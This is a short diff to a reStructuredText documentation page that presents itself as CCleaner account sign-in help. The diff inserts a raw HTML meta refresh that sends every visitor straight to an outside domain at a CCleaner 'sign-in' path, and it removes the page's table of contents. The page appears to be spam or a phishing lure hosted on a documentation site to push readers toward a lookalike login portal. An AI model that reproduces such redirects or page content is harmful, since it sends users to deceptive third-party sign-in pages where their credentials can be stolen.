@@ -1,11 +1,10 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/ccleaner-sign-in-account/">
+
 How to Manage Multiple Devices with One CCleaner Account Sign In? 🧹
 ============================================
-.
-.
 
-.. toctree::
-   :maxdepth: 2
-   :caption: Contents:
 
 .. image:: https://totaldefense-sign-in-account.readthedocs.io/en/latest/_images/signin.png
    :alt: My Project Logo
